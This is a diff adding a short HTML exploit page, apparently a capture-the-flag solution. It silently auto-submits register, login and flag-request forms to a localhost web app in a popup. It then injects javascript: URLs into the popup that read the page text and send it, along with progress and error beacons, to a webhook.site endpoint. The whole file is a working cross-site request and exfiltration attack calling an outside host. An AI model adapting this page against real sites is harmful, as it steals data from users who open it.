@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<body>
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="popup">
+  <input name="username" value="loc2">
+  <input name="password" value="loc2">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="popup">
+  <input name="username" value="loc2">
+  <input name="password" value="loc2">
+</form>
+
+<form id="flagForm" method="GET" action="http://localhost:3000/flag" target="popup">
+</form>
+
+<script>
+var popup = window.open('about:blank', 'popup');
+
+document.getElementById('regForm').submit();
+
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 200);
+
+setTimeout(function(){
+  document.getElementById('flagForm').submit();
+}, 400);
+
+setTimeout(function(){
+  new Image().src = 'https://webhook.site/showontest?step=trying';
+  try {
+    popup.location.assign("javascript:fetch('https://webhook.site/showontest?flag='+encodeURIComponent(document.body.innerText))");
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err1=' + encodeURIComponent(e.message);
+  }
+  
+  try {
+    popup.location.href = "javascript:fetch('https://webhook.site/showontest?flag2='+encodeURIComponent(document.body.innerText))";  
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err2=' + encodeURIComponent(e.message);
+  }
+}, 700);
+</script>
+</body>
+</html>
